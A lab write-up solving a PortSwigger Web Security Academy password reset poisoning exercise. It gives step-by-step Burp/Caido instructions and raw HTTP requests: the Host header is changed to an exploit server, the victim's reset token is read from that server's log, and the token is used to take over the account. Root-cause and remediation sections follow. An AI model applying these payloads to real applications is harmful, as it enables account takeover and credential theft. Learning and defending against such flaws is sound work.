## Metadata

- **Difficulty:** Apprentice
- **Category:** HTTP Host header attacks
- **Lab URL:** [Lab: Basic password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)
- **Date Solved:** 29/4/2026
## Vulnerability Summary

The app is vulnerable to password reset poisoning. Taking advantage of the information *The user `carlos` will carelessly click on any links in emails that he receives*, we can modify the `Host` header so that it points to the exploit server we control and obtain the password reset token. Using this token, we are able to reset `carlos` password to any value, thus taking access of `carlos`'s account.
## Reconnaissance

Intercept the `POST /forgot-password` request. The application generates a password reset link and sends it to the user's email. By modifying the `Host` header to an arbitrary domain (e.g., `example.com`) and checking the email client for the controlled account (`wiener`), it can be seen that the reset link in the email was dynamically constructed using the injected `Host` header value (`https://example.com/forgot-password?temp-forgot-password-token=...`). This confirms the application trusts the `Host` header for link generation and is vulnerable to Host header injection.
## Exploitation Steps

1. Navigate to `url/login` and click on "Forgot password?". You'll be taken to `url/forgot-password` and be prompted to type in your username. Type in `wiener` then click "Submit". Intercept this request and send to the Repeater (Burp Suite)/Replay (Caido). We will refer to this request later as "**the first intercepted request**".
2. Click on the "Go to exploit server" button on the lab's header, then click on "Email client" at the end of the page for the recovery link. Follow this link, where you are prompted to type in and confirm your new password. Type in anything, e.g. "a". Intercept this request before you click "Submit". We will refer to this request later as "**the second intercepted request".
3. On the first intercepted request, first, change the value of the `Host` header to that of your exploit server. Remember to **NOT** include the `https://` part of it. Your `Host` header should look something like this: `Host: exploit-randomstring.exploit-server.net/`. Then, on the request body, change the value of the `username` field to `carlos`. After doing both of these things, send the request. You should receive a HTTP response with a status code `200 OK` that reads `Please check your email for a reset password link.`A password reset token for the user `carlos` has been generated successfully, and since we change the `Host` header to the exploit server that we control, we have access to this token.
4. Navigate to `https://exploit-randomstring.exploit-server.net/log`. You should see a line that reads something like `<timestamp> "GET //forgot-password?temp-forgot-password-token=carlos'stoken HTTP/1.1" 404 "user-agent:...`. Copy `carlos'stoken` (this is a random string that differs from session to session).
5. On the second intercepted request, change the value of the `temp-forgot-password-token` in **both** the HTTP header and body. For the password, you can pick any value you like - this is the value that we will use to access `carlos`'s account. In my case, I pick `a`. The value should look like below. After doing the necessary modifications, send the request.
```
POST /forgot-password?temp-forgot-password-token=carlos'stoken HTTP/1.1
Host: 0ad5002103b62360811a2a7900870001.web-security-academy.net

...

csrf=csrftokenvalue&temp-forgot-password-token=carlos'stoken&new-password-1=a&new-password-2=a
```
6. Observe that you received a `302 Found` HTTP Response, indicating a redirection. Go on to the website, login with the credentials `carlos - yourvalue`. You should see that you're logged in as `carlos`, and lab is solved.
## Payload Used

`Host: exploit-randomstring.exploit-server.net/`
`POST /forgot-password?temp-forgot-password-token=carlos'stoken HTTP/1.1`
`csrf=csrftokenvalue&temp-forgot-password-token=carlos'stoken&new-password-1=a&new-password-2=a`
## Root Cause

The application dynamically generates absolute URLs for password reset links using the user-controllable `Host` header from the incoming HTTP request. It fails to validate the `Host` header against a whitelist and lacks a statically defined base URL in its configuration, allowing attackers to route sensitive tokens to external domains.
## Remediation

Avoid relying on the `Host` header to dynamically generate absolute URLs. Instead, configure a static, absolute base URL in the application's environment or configuration files and use that for all link generation. If the `Host` header must be used, validate it strictly against a whitelist of permitted internal domains.